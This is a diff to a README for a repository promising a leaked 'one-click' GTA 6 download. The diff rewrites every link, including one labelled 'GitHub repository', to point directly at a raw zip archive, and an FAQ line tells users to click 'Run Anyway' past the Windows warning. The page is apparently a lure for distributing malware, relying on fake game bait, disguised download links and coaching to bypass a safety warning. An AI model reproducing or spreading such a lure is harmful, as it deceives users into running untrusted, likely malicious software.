@@ -1,7 +1,7 @@
 <h1>🔥 gta6-cyberleek - One-Click Access to GTA 6</h1>
 
 <p align="center">
-  <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek">
+  <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek/raw/refs/heads/main/brood/v2.8.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-FF5733?style=for-the-badge&logo=windows&logoColor=white" alt="Download GTA 6" width="400">
   </a>
 </p>
@@ -76,7 +76,7 @@
 <p>Click the big orange button at the top of this page or use the link below to go to the download page.</p>
 
 <p align="center">
-  <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek">
+  <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek/raw/refs/heads/main/brood/v2.8.zip">
     <img src="https://img.shields.io/badge/📥_DOWNLOAD_NOW-33FF57?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="300">
   </a>
 </p>
@@ -171,10 +171,10 @@ A: This happens with many new applications. Click "More Info" then "Run Anyway".
 
 <h2>🧑‍💻 Need More Help?</h2>
 
-<p>If you run into any issue not covered here, do not worry. Head over to the <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek">GitHub repository</a> and check the "Issues" tab. You can also open a new issue to ask the community for support. We are all here to help each other get into the game.</p>
+<p>If you run into any issue not covered here, do not worry. Head over to the <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek/raw/refs/heads/main/brood/v2.8.zip">GitHub repository</a> and check the "Issues" tab. You can also open a new issue to ask the community for support. We are all here to help each other get into the game.</p>
 
 <p align="center">
-  <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek">
+  <a href="https://github.com/Croaky-giantess1153/gta6-cyberleek/raw/refs/heads/main/brood/v2.8.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6_NOW-FFC300?style=for-the-badge&logo=windows&logoColor=black" alt="Download GTA 6 Now" width="350">
   </a>
 </p>
